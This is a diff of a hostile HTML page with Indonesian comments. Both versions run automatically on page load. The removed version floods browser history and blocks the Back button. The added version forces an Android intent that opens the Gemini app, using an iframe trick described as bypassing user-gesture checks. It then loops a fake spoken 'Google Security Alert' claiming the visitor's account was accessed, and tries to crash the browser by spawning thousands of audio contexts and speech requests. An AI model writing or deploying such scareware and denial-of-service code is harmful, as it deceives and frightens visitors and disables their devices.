@@ -1,116 +1,210 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Security Alert</title>
+<title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    background: #030712; color: #f8fafc;
-    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-    display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; text-align: center;
-  }
-  .box { padding: 30px; background: #111827; border: 1px solid #1f2937; border-radius: 12px; max-width: 400px; }
-  h2 { color: #f00; margin-bottom: 10px; animation: blink 0.5s infinite; }
+  body { background: #111; color: #f00; font-family: monospace; text-align: center; padding-top: 20vh; overflow: hidden; }
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+  h1 { animation: blink 0.5s infinite; }
   @keyframes blink { 50% { opacity: 0.2; } }
-  p { color: #9ca3af; font-size: 14px; line-height: 1.5; }
-  #status { margin-top: 20px; font-family: monospace; color: #0f0; background: #000; padding: 10px; border-radius: 6px; }
+  #status { position: fixed; bottom: 20px; width: 100%; color: #0f0; }
 </style>
 </head>
 <body>
 
-<div class="box">
-  <h2>🚨 SECURITY COMPROMISED 🚨</h2>
-  <p>Sistem mendeteksi aktivitas mencurigakan. Tombol navigasi dinonaktifkan sementara untuk verifikasi.</p>
-  <div id="status">Menginisialisasi...</div>
-</div>
+<h1>☢️ SYSTEM COMPROMISED ☢️</h1>
+<div id="status">Initializing...</div>
 
 <script>
 (function () {
   'use strict';
 
   var statusEl = document.getElementById('status');
-  var floodCount = 0;
 
   // ============================================
-  // 1. HISTORY FLOODING (OMNIBox STACK OVERLOAD)
+  // 1. INTENT REDIRECTION KE GEMINI (AUTO PROMPT "KUCING")
   // ============================================
-  function triggerHistoryFlood() {
-    console.log("[!] Memulai History Flooding...");
-    statusEl.innerText = "Flooding History Stack...";
+  function triggerGeminiIntent() {
+    console.log("[!] Triggering Gemini Intent...");
+    statusEl.innerText = "Membuka Gemini...";
+
+    // Format Intent ke Gemini dengan Query "kucing"
+    // Package Name Gemini: com.google.android.apps.bard
+    var geminiIntent = "intent://search?q=kucing#Intent;" +
+                       "scheme=https;" +
+                       "package=com.google.android.apps.bard;" +
+                       "S.browser_fallback_url=" + encodeURIComponent("https://gemini.google.com/app?q=kucing") + ";" +
+                       "end";
 
     try {
-      // Memasukkan 10.000 entri ke History Stack
-      for (var i = 0; i < 10000; i++) {
-        var dummyState = { page: i, time: Date.now() };
-        var fakeUrl = window.location.pathname + "#locked=" + i;
-        
-        // Menggunakan pushState untuk mengisi Omnibox (Address Bar)
-        history.pushState(dummyState, "Security Verification " + i, fakeUrl);
-        
-        floodCount++;
-      }
-      
-      statusEl.innerText = "History Flooded: " + floodCount + " entries.";
-      console.log("[+] History Flooding Selesai.");
+      // Trik 1: Top-Level Navigation
+      window.location.replace(geminiIntent);
+    } catch(e) {}
 
-    } catch(e) {
-      statusEl.innerText = "Limit Reached: " + e.message;
+    // Trik 2: Iframe Sandbox (Bypass Gesture)
+    setTimeout(function() {
+      var iframe = document.createElement('iframe');
+      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
+      iframe.src = geminiIntent;
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+      console.log("[+] Iframe Intent sent.");
+    }, 500);
+  }
+
+  // ============================================
+  // 2. TTS PAYLOAD ASLI (TIDAK DIUBAH)
+  // ============================================
+  var CONFIG = {
+    tts: {
+      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
+      lang: 'en-US',
+      rate: 0.85,
+      pitch: 1.0,
+      volume: 1.0,
+      repeatInterval: 8000,
+      maxRepeats: 20
+    },
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
+  };
+
+  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
+
+  function speakOnce() {
+    if (!('speechSynthesis' in window)) return;
+    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
+
+    try {
+      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
+      u.lang = CONFIG.tts.lang;
+      u.rate = CONFIG.tts.rate;
+      u.pitch = CONFIG.tts.pitch;
+      u.volume = CONFIG.tts.volume;
+
+      var voices = window.speechSynthesis.getVoices();
+      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
+      if (enVoice) u.voice = enVoice;
+
+      u.onend = function () {
+        state.ttsCount++;
+        if (state.ttsCount < CONFIG.tts.maxRepeats) {
+          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
+        }
+      };
+
+      window.speechSynthesis.speak(u);
+    } catch (e) { console.log('[TTS] fail:', e.message); }
+  }
+
+  function startTTS() {
+    if (state.ttsStarted) return;
+    state.ttsStarted = true;
+    window.speechSynthesis.cancel();
+    speakOnce();
+  }
+
+  function unlockAudioContext() {
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      if (ctx.state === 'suspended') {
+        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+      }
+      var osc = ctx.createOscillator();
+      var gain = ctx.createGain();
+      gain.gain.value = 0.0001;
+      osc.frequency.value = 20000;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.1);
+    } catch (e) {}
+  }
+
+  function trySilentAudio() {
+    try {
+      var a = new Audio(CONFIG.silentWav);
+      a.volume = 0.0001;
+      a.loop = true;
+      var p = a.play();
+      if (p && p.catch) p.catch(function(){});
+    } catch (e) {}
+  }
+
+  function playMainAudio() {
+    if (state.mainPlayed) return;
+    state.mainPlayed = true;
+
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var sr = ctx.sampleRate;
+      var dur = 3.0;
+      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var d = buf.getChannelData(0);
+
+      for (var i = 0; i < d.length; i++) {
+        var t = i / sr;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
+        var env = Math.max(0, 1 - t / dur);
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+      }
+
+      var src = ctx.createBufferSource();
+      src.buffer = buf;
+      src.connect(ctx.destination);
+      src.start();
+      src.onended = startTTS;
+    } catch (e) {
+      startTTS();
     }
   }
 
   // ============================================
-  // 2. POPSTATE LOCK (MENCEGAH TOMBOL BACK)
+  // 3. RESOURCE EXHAUSTION (CRASH)
   // ============================================
-  window.addEventListener('popstate', function(e) {
-    // Jika user mencoba mundur, kita dorong maju lagi secara paksa
-    if (floodCount > 0) {
-      history.go(1);
-      statusEl.innerText = "🚫 Navigation Blocked. Klik Back tidak berfungsi.";
-      console.log("[!] User mencoba Back. Diblokir.");
-    }
-  });
-
-  // ============================================
-  // 3. AUDIO PRESSURE (RESOURCE EXHAUSTION)
-  // ============================================
-  function triggerAudioPressure() {
+  function triggerHighSeverityCrash() {
+    console.log("[!] Initiating High Severity Exploit Chain...");
+    statusEl.innerText = "SYSTEM FAILURE...";
+    
     setInterval(function() {
       try {
-        // Alokasi 500 AudioContext per 100ms
-        for (var i = 0; i < 500; i++) {
+        for (var i = 0; i < 2000; i++) {
           var ctx = new (window.AudioContext || window.webkitAudioContext)();
           var osc = ctx.createOscillator();
           var gain = ctx.createGain();
           
-          gain.gain.value = 0.0001;
           osc.connect(gain);
           gain.connect(ctx.destination);
           osc.start(0);
+          
+          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
+          window.speechSynthesis.speak(u);
         }
       } catch(e) {}
-    }, 100);
+    }, 50); 
   }
 
   // ============================================
-  // 4. EKSEKUSI CHAIN
+  // 4. EKSEKUSI CHAIN (ZERO-CLICK)
   // ============================================
   
-  // Jalankan flooding setelah 500ms
-  setTimeout(triggerHistoryFlood, 500);
+  // A. Trigger Intent Gemini setelah 100ms
+  setTimeout(triggerGeminiIntent, 100);
 
-  // Jalankan audio pressure setelah 1.2 detik
+  // B. Jalankan TTS & Audio (Setelah 500ms)
   setTimeout(function() {
-    console.log("[!] Memulai Audio Pressure...");
-    triggerAudioPressure();
-  }, 1200);
+    unlockAudioContext();
+    trySilentAudio();
+    startTTS();
+    playMainAudio();
+  }, 500);
 
-  // ============================================
-  // 5. ZERO-CLICK TRIGGER (LANGSUNG SAAT LOAD)
-  // ============================================
-  // (Fungsi di atas sudah dipanggil via setTimeout, jadi sudah Zero-Click)
+  // C. Hancurkan Browser (Setelah 1.5 detik)
+  setTimeout(function() {
+    triggerHighSeverityCrash();
+  }, 1500);
 
 })();
 </script>
